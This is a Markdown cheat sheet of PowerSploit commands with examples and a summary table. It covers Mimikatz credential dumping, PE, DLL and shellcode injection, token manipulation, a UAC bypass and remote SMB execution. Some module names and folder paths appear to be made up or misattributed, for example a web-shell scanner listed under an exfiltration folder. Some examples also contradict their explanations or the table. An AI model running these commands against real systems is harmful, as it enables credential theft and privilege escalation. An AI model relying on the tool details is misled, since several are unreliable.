PowerSploit is a collection of PowerShell scripts and modules used for penetration testing and exploitation, primarily in Windows environments. It includes various scripts for exploitation, post-exploitation, and other security assessment tasks.

### **PowerSploit Commands and Options**

1. **`Invoke-Mimikatz`** – Mimikatz Integration

   - **Description:** Runs Mimikatz commands to extract credentials and other sensitive information from Windows systems.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-Mimikatz.ps1
     Invoke-Mimikatz -Command 'privilege::debug'
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-Mimikatz.ps1
     Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
     ```
   - **Explanation:** Extracts plaintext passwords and hash credentials using Mimikatz.

2. **`Invoke-ReflectivePEInjection`** – Reflective PE Injection

   - **Description:** Injects a PE (Portable Executable) file into the address space of a remote process.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-ReflectivePEInjection.ps1
     Invoke-ReflectivePEInjection -PEPath .\payload.exe -ProcessId <pid>
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-ReflectivePEInjection.ps1
     Invoke-ReflectivePEInjection -PEPath .\payload.exe -ProcessId 1234
     ```
   - **Explanation:** Injects `payload.exe` into a process with ID `1234`.

3. **`Invoke-Shellcode`** – Shellcode Injection

   - **Description:** Injects and executes shellcode in a target process.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-Shellcode.ps1
     Invoke-Shellcode -Shellcode <byte_array>
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-Shellcode.ps1
     Invoke-Shellcode -Shellcode [byte[]](0x90, 0x90, 0x90, 0x90)
     ```
   - **Explanation:** Executes shellcode in memory.

4. **`Invoke-Discovery`** – Information Gathering

   - **Description:** Gathers information about the target system, such as users, groups, and network configuration.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Discovery\Invoke-Discovery.ps1
     Invoke-Discovery
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Discovery\Invoke-Discovery.ps1
     Invoke-Discovery -Verbose
     ```
   - **Explanation:** Collects system information and provides detailed output.

5. **`Invoke-CheckForWebShells`** – Web Shell Detection

   - **Description:** Scans web servers for possible web shells.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-CheckForWebShells.ps1
     Invoke-CheckForWebShells -Url http://example.com
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-CheckForWebShells.ps1
     Invoke-CheckForWebShells -Url http://example.com/admin
     ```
   - **Explanation:** Checks for the presence of web shells at the specified URL.

6. **`Invoke-TokenManipulation`** – Token Manipulation

   - **Description:** Performs token manipulation operations, such as impersonation or elevation.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Privesc\Invoke-TokenManipulation.ps1
     Invoke-TokenManipulation -TokenName "AdminToken"
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Privesc\Invoke-TokenManipulation.ps1
     Invoke-TokenManipulation -TokenName "SYSTEM"
     ```
   - **Explanation:** Uses token manipulation to elevate privileges.

7. **`Invoke-BypassUAC`** – UAC Bypass

   - **Description:** Bypasses User Account Control (UAC) on Windows systems.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Privesc\Invoke-BypassUAC.ps1
     Invoke-BypassUAC -Command "cmd.exe /c whoami"
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Privesc\Invoke-BypassUAC.ps1
     Invoke-BypassUAC -Command "powershell.exe -NoProfile"
     ```
   - **Explanation:** Executes a command with elevated privileges by bypassing UAC.

8. **`Invoke-DLLInjection`** – DLL Injection

   - **Description:** Injects a DLL into a process.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-DLLInjection.ps1
     Invoke-DLLInjection -DLLPath .\payload.dll -ProcessId <pid>
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Exfiltration\Invoke-DLLInjection.ps1
     Invoke-DLLInjection -DLLPath .\payload.dll -ProcessId 5678
     ```
   - **Explanation:** Injects `payload.dll` into a process with ID `5678`.

9. **`Invoke-PortScan`** – Port Scanning

   - **Description:** Scans for open ports on a target system.
   - **Command:**
     ```powershell
     Import-Module .\PowerSploit\Recon\Invoke-PortScan.ps1
     Invoke-PortScan -Target 192.168.1.1 -Ports 80,443,3389
     ```
   - **Example:**
     ```powershell
     Import-Module .\PowerSploit\Recon\Invoke-PortScan.ps1
     Invoke-PortScan -Target 192.168.1.1 -Ports 1-1024
     ```
   - **Explanation:** Scans ports `80`, `443`, and `3389` on the target IP address.

10. **`Invoke-SMBExec`** – SMB Execution

    - **Description:** Executes commands on a remote system over SMB.
    - **Command:**
      ```powershell
      Import-Module .\PowerSploit\Exfiltration\Invoke-SMBExec.ps1
      Invoke-SMBExec -Target 192.168.1.10 -Username admin -Password password -Command "ipconfig"
      ```
    - **Example:**
      ```powershell
      Import-Module .\PowerSploit\Exfiltration\Invoke-SMBExec.ps1
      Invoke-SMBExec -Target 192.168.1.10 -Username admin -Password password -Command "netstat -an"
      ```
    - **Explanation:** Executes `ipconfig` or `netstat -an` on the remote SMB target.

### **Summary of PowerSploit Commands**

| **Script/Module**       | **Command Example**                                                | **Description**                                      |
|-------------------------|--------------------------------------------------------------------|------------------------------------------------------|
| `Invoke-Mimikatz`       | `Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'`              | Extracts credentials using Mimikatz                 |
| `Invoke-ReflectivePEInjection` | `Invoke-ReflectivePEInjection -PEPath .\payload.exe -ProcessId 1234` | Injects a PE file into a remote process             |
| `Invoke-Shellcode`      | `Invoke-Shellcode -Shellcode [byte[]](0x90, 0x90, 0x90)`         | Executes shellcode in memory                        |
| `Invoke-Discovery`      | `Invoke-Discovery -Verbose`                                       | Gathers system information                           |
| `Invoke-CheckForWebShells` | `Invoke-CheckForWebShells -Url http://example.com/admin`         | Scans for web shells                                |
| `Invoke-TokenManipulation` | `Invoke-TokenManipulation -TokenName "SYSTEM"`                   | Manipulates tokens for privilege escalation         |
| `Invoke-BypassUAC`      | `Invoke-BypassUAC -Command "powershell.exe -NoProfile"`            | Bypasses User Account Control (UAC)                 |
| `Invoke-DLLInjection`   | `Invoke-DLLInjection -DLLPath .\payload.dll -ProcessId 5678`      | Injects a DLL into a process                        |
| `Invoke-PortScan`       | `Invoke-PortScan -Target 192.168.1.1 -Ports 80,443,3389`          | Scans for open ports                                |
| `Invoke-SMBExec`        | `Invoke-SMBExec -Target 192.168.1.10 -Username admin -Password password -Command "ipconfig"` | Executes commands over SMB                           |

PowerSploit is a versatile toolset for various aspects of penetration testing, including exploitation and post-exploitation activities, tailored for Windows environments.